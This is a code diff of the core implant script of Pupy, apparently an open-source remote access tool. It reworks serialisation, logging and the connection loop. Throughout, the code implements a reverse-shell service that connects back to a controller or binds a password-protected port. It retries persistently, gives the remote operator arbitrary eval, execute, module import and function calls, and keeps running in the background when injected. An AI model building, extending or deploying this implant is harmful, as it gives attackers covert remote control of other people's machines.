@@ -31,42 +31,57 @@
 # POSSIBILITY OF SUCH DAMAGE
 # ---------------------------------------------------------------
 
-import site
 import sys
+import imp
+
+try:
+    import pupy
+    setattr(pupy, 'pseudo', False)
+
+except ImportError, e:
+    mod = imp.new_module("pupy")
+    mod.__name__ = "pupy"
+    mod.__file__ = "pupy://pupy"
+    mod.__package__ = "pupy"
+    sys.modules["pupy"] = mod
+    mod.pseudo = True
+
+    import pupy
+
+import socket
+socket.setdefaulttimeout(60)
+
+import logging
+
+logging.basicConfig()
+logger = logging.getLogger('pp')
+logger.setLevel(logging.WARNING)
+
 import time
-import rpyc
 from rpyc.core.service import Service, ModuleNamespace
-from rpyc.lib.compat import execute, is_py3k
-import rpyc.core.stream
-import rpyc.utils.factory
+from rpyc.lib.compat import execute
+from rpyc import async
+
 import threading
-import weakref
 import traceback
 import os
-import subprocess
-import threading
-import StringIO
 import json
-import urllib2
-import urllib
 import platform
-import re
-import ssl
 import random
-import imp
-import json
 import argparse
+
 from network import conf
 from network.lib.base_launcher import LauncherError
 from network.lib.connection import PupyConnection
 from network.lib.streams.PupySocketStream import PupyChannel
-import logging
+from network.lib.buffer import Buffer
+
 import shlex
-import marshal
 import zlib
 import signal
 
 import cPickle
+import ssl
 
 import hashlib
 import uuid
@@ -83,30 +98,59 @@ except ImportError:
     pass
 
 except Exception as e:
-    logging.warning(e)
+    logger.warning(e)
 
-logging.getLogger().setLevel(logging.WARNING)
-
-try:
-    import pupy
-except ImportError, e:
-    mod = imp.new_module("pupy")
-    mod.__name__ = "pupy"
-    mod.__file__ = "pupy://pupy"
-    mod.__package__ = "pupy"
-    sys.modules["pupy"] = mod
-    mod.pseudo = True
-
-    import pupy
+import umsgpack
 
 pupy.infos = {}  # global dictionary to store informations persistent through a deconnection
 pupy.namespace = None
+
+if not sys.platform == 'win32' and not pupy.pseudo:
+    setattr(ssl, '_SSL_FILES', [
+        "/etc/ssl/certs/ca-certificates.crt",
+        "/etc/pki/tls/certs/ca-bundle.crt",
+        "/etc/ssl/ca-bundle.pem",
+        "/etc/pki/tls/cacert.pem",
+        "/etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pem",
+    ])
+
+    setattr(ssl, '_SSL_PATHS', [
+        "/etc/ssl/certs",
+        "/system/etc/security/cacerts",
+        "/usr/local/share/certs",
+        "/etc/pki/tls/certs",
+        "/etc/openssl/certs",
+        "/etc/opt/csw/ssl/certs",
+    ])
+
+    def set_default_verify_paths(self):
+        for path in ssl._SSL_PATHS:
+            try:
+                self.load_verify_locations(capath=path)
+            except:
+                pass
+
+        for path in ssl._SSL_FILES:
+            try:
+                self.load_verify_locations(cafile=path)
+            except:
+                pass
+
+        del path
+
+    ssl.SSLContext.set_default_verify_paths = set_default_verify_paths
+
 
 def print_exception(tag=''):
     global debug
 
     remote_print_error = None
     dprint = None
+
+    trace = str(traceback.format_exc())
+    error = ' '.join([ x for x in (
+        tag, 'Exception:', trace
+    ) if x ])
 
     try:
         import pupyimporter
@@ -115,26 +159,27 @@ def print_exception(tag=''):
     except:
         pass
 
-    import traceback
-    trace = str(traceback.format_exc())
-    error = ' '.join([ x for x in (
-        tag, 'Exception:', trace
-    ) if x ])
-
     if remote_print_error:
         try:
+            dprint('Remote error: {}'.format(error))
             remote_print_error(error)
-        except Exception, e:
+        except:
             pass
+
     elif dprint:
         dprint(error)
     elif debug:
         try:
-            logging.error(error)
+            logger.error(error)
         except:
             print error
 
 class PStore(object):
+
+    __slots__ = (
+        '_pstore_path', '_pstore_key', '_pstore'
+    )
+
     def __new__(cls, *args, **kw):
         if not hasattr(cls, '_instance'):
             orig = super(PStore, cls)
@@ -235,6 +280,11 @@ class PStore(object):
 
 
 class Task(threading.Thread):
+
+    __slots__ = (
+        '_pstore', '_stopped', '_manager', '_dirty'
+    )
+
     stopped = None
     results_type = list
 
@@ -306,6 +356,8 @@ class Manager(object):
     PAUSE = 1
     SESSION = 2
 
+    __slots__ = ( 'tasks', 'pstore' )
+
     def __new__(cls, *args, **kw):
         if not hasattr(cls, '_instance'):
             orig = super(Manager, cls)
@@ -357,6 +409,10 @@ class Manager(object):
             return False
 
     @property
+    def dirty(self):
+        return any(x.dirty for x in self.tasks.itervalues())
+
+    @property
     def status(self):
         return {
             name:{
@@ -383,25 +439,33 @@ class Manager(object):
 
 setattr(pupy, 'manager', Manager(PStore()))
 setattr(pupy, 'Task', Task)
+setattr(pupy, 'connected', False)
+setattr(sys, 'terminated', False)
+setattr(sys, 'terminate', None)
 
 def safe_obtain(proxy):
     """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """
+
     if type(proxy) in [list, str, bytes, dict, set, type(None)]:
         return proxy
-    conn = object.__getattribute__(proxy, "____conn__")()
-    return json.loads(
+
+    try:
+        conn = object.__getattribute__(proxy, "____conn__")()
+    except:
+        return proxy
+
+    if not hasattr(conn, 'obtain'):
+        setattr(conn, 'obtain', conn.root.msgpack_dumps)
+
+    return umsgpack.loads(
         zlib.decompress(
-            conn.root.json_dumps(proxy, compressed=True)
+            conn.obtain(proxy, compressed=True)
         )
     ) # should prevent any code execution
 
-def obtain(proxy):
-    """ allows to convert netref types into python native types """
-    return safe_obtain(proxy)
-
 debug = False
 
-setattr(pupy, 'obtain', obtain) # I don't see a better spot to put this util
+setattr(pupy, 'obtain', safe_obtain) # I don't see a better spot to put this util
 
 LAUNCHER = "connect"  # the default launcher to start when no argv
 # default launcher arguments
@@ -433,26 +497,46 @@ class ReverseSlaveService(Service):
     """ Pupy reverse shell rpyc service """
     __slots__ = ["exposed_namespace", "exposed_cleanups"]
 
+    def __init__(self, conn):
+        self.exposed_namespace = {}
+        self.exposed_cleanups = []
+        self._conn = conn
+
     def on_connect(self):
         self.exposed_namespace = {}
         self.exposed_cleanups = []
         self._conn._config.update(REVERSE_SLAVE_CONF)
 
+        infos = Buffer()
+        umsgpack.dump(self.exposed_get_infos(), infos)
+
         pupy.namespace = UpdatableModuleNamespace(self.exposed_getmodule)
-        self._conn.root.set_modules(pupy.namespace)
+        self._conn.root.initialize_v1(
+            self.exposed_namespace,
+            pupy.namespace,
+            sys.modules['__builtin__'],
+            self.exposed_register_cleanup,
+            self.exposed_unregister_cleanup,
+            self.exposed_obtain_call,
+            self.exposed_exit,
+            self.exposed_eval,
+            self.exposed_execute,
+            sys.modules.get('pupyimporter'),
+            infos
+        )
 
     def on_disconnect(self):
         for cleanup in self.exposed_cleanups:
             try:
                 cleanup()
-            except Exception as e:
+            except:
                 print_exception('[D]')
 
         self.exposed_cleanups = []
 
         try:
             self._conn.close()
-        except Exception as e:
+        except:
             print_exception('[DC]')
 
         if os.name == 'posix':
@@ -468,10 +552,13 @@ class ReverseSlaveService(Service):
 
 
     def exposed_exit(self):
-        try:
-            return True
-        finally:
-            os._exit(0)
+        sys.terminated = True
+
+        if self._conn:
+            self._conn.close()
+
+        if sys.terminate:
+            sys.terminate()
 
     def exposed_register_cleanup(self, method):
         self.exposed_cleanups.append(method)
@@ -505,6 +592,26 @@ class ReverseSlaveService(Service):
     def exposed_getmodule(self, name):
         """imports an arbitrary module"""
         return __import__(name, None, None, "*")
+
+    def exposed_obtain_call(self, function, packed_args):
+        if packed_args is not None:
+            packed_args = zlib.decompress(packed_args)
+            args, kwargs = umsgpack.loads(packed_args)
+        else:
+            args, kwargs = [], {}
+
+        result = function(*args, **kwargs)
+
+        packed_result = umsgpack.dumps(result)
+        packed_result = zlib.compress(packed_result)
+
+        return packed_result
+
+    def exposed_msgpack_dumps(self, obj, compressed=False):
+        data = Buffer(compressed=compressed)
+        umsgpack.dump(obj, data)
+        data.flush()
+        return data
 
     def exposed_json_dumps(self, obj, compressed=False):
         try:
@@ -540,9 +647,6 @@ class ReverseSlaveService(Service):
 class BindSlaveService(ReverseSlaveService):
 
     def on_connect(self):
-        self.exposed_namespace = {}
-        self.exposed_cleanups = []
-        self._conn._config.update(REVERSE_SLAVE_CONF)
         import pupy
         try:
             from pupy_credentials import BIND_PAYLOADS_PASSWORD
@@ -556,8 +660,8 @@ class BindSlaveService(ReverseSlaveService):
             self._conn.close()
             raise KeyboardInterrupt("wrong password")
 
-        pupy.namespace = UpdatableModuleNamespace(self.exposed_getmodule)
-        self._conn.root.set_modules(pupy.namespace)
+        super(BindSlaveService, self).on_connect()
+
 
 def get_next_wait(attempt):
     if attempt < 120:
@@ -566,7 +670,6 @@ def get_next_wait(attempt):
         return random.randint(30, 50) / 10.0
     else:
         return random.randint(150, 300) / 10.0
-
 
 def set_connect_back_host(HOST):
     import pupy
@@ -595,6 +698,11 @@ def main():
     global LAUNCHER_ARGS
     global debug
     global attempt
+
+    if hasattr(pupy, 'initialized'):
+        return
+
+    setattr(pupy, 'initialized', True)
 
     try:
         if hasattr(signal, 'SIGHUP'):
@@ -638,11 +746,11 @@ def main():
             config_file = pupy.get_pupy_config()
             exec config_file in globals()
         except ImportError, e:
-            logging.warning(
+            logger.warning(
                 "ImportError: Couldn't load pupy config: {}".format(e))
 
     if LAUNCHER not in conf.launchers:
-        exit("No such launcher: %s" % LAUNCHER)
+        sys.exit("No such launcher: %s" % LAUNCHER)
 
     if debug:
         logging.getLogger().setLevel(logging.DEBUG)
@@ -653,9 +761,9 @@ def main():
         launcher.parse_args(LAUNCHER_ARGS)
     except LauncherError as e:
         launcher.arg_parser.print_usage()
-        os._exit(str(e))
+        os._exit(1)
 
-    if getattr(pupy, 'pseudo', False):
+    if pupy.pseudo:
         set_connect_back_host(launcher.get_host())
     else:
         pupy.get_connect_back_host = launcher.get_host
@@ -665,12 +773,12 @@ def main():
     pupy.infos['launcher_inst'] = launcher
     pupy.infos['transport'] = launcher.get_transport()
     pupy.infos['debug'] = debug
-    pupy.infos['native'] = not getattr(pupy, 'pseudo', False)
+    pupy.infos['native'] = pupy.pseudo == False
     pupy.infos['revision'] = getattr(pupy, 'revision', None)
 
-    exited = False
+    logger.debug('Starting rpyc loop')
 
-    while not exited:
+    while not sys.terminated:
         try:
             rpyc_loop(launcher)
 
@@ -678,21 +786,31 @@ def main():
             print_exception('[ML]')
 
             if type(e) == SystemExit:
-                exited = True
+                sys.terminated = True
 
         finally:
-            if not exited:
+            if not sys.terminated:
                 time.sleep(get_next_wait(attempt))
                 attempt += 1
 
+    logger.debug('Exited')
 
 def rpyc_loop(launcher):
     global attempt
     global debug
 
-    stream=None
+    stream = None
     for ret in launcher.iterate():
+        logger.debug('Operation state: Terminated = {}'.format(sys.terminated))
+
+        if sys.terminated:
+            logger.warning('Loop terminated')
+            break
+
+        logger.debug('Acquire launcher: {}'.format(ret))
+
         try:
+            pupy.connected = False
             if isinstance(ret, tuple):  # bind payload
                 server_class, port, address, authenticator, stream, transport, transport_kwargs = ret
                 s = server_class(
@@ -705,43 +823,25 @@ def rpyc_loop(launcher):
                     transport_kwargs=transport_kwargs,
                     pupy_srv=None,
                 )
+
+                sys.terminate = s.close
+                pupy.connected = True
+
                 s.start()
+                sys.terminate = None
+                pupy.connected = False
 
             else:  # connect payload
                 stream = ret
 
-                def check_timeout(event, cb, timeout=60):
-                    time.sleep(timeout)
-                    if not event.is_set():
-                        logging.error('timeout occured!')
-                        cb()
+                conn = PupyConnection(
+                    None, ReverseSlaveService,
+                    PupyChannel(stream), config={},
+                    ping=stream.KEEP_ALIVE_REQUIRED
+                )
 
-                event = threading.Event()
-                t = threading.Thread(
-                    target=check_timeout, args=(
-                        event, stream.close))
-                t.daemon = True
-                t.start()
-
-                lock = threading.RLock()
-                conn = None
-
-                try:
-                    conn = PupyConnection(
-                        lock, None, ReverseSlaveService,
-                        PupyChannel(stream), config={}
-                    )
-                    conn._init_service()
-                finally:
-                    event.set()
-
-                attempt = 0
-                with lock:
-                    while not conn.closed:
-                        interval, timeout = conn.get_pings()
-                        conn.serve(interval or 10)
-                        if interval:
-                            conn.ping(timeout=timeout)
+                conn.init()
+                conn.loop()
 
         except SystemExit:
             raise
@@ -753,6 +853,8 @@ def rpyc_loop(launcher):
             print_exception('[M]')
 
         finally:
+            logger.debug('Launcher completed')
+
             if stream is not None:
                 try:
                     stream.close()
@@ -762,7 +864,6 @@ def rpyc_loop(launcher):
 if __name__ == "__main__":
     main()
 else:
-    import platform
     if not platform.system() == 'android':
         if not hasattr(platform, 'pupy_thread'):
             # to allow pupy to run in background when imported or injected
